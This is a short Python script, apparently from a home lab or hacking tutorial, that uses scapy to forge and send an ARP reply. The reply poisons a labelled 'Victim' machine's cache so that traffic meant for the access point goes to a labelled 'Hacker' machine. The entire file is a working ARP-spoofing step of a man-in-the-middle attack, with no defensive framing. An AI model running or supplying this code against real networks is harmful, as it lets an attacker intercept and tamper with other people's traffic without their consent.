#! /usr/bin/env python
import scapy.all as scapy


# AP: 10.211.55.1/ 00:1c:42:00:00:18
# Victim: 10.211.55.4/00:1c:42:83:95:fc
# Hacker: 10.211.55.3/ 00:1c:42:2e:e8:18
# op=1 ==> request
# op=2 ==> response
# target_ip = "10.211.55.4"
# target_mac = "00:1c:42:83:95:fc"
# spoof_ip = "10.211.55.1"
def spoof():
    packet = scapy.ARP(op=2, pdst="10.211.55.4",
                       hwdst="00:1c:42:83:95:fc", psrc="10.211.55.1")
    print(packet.show())
    print(packet.summary())
    scapy.send(packet)
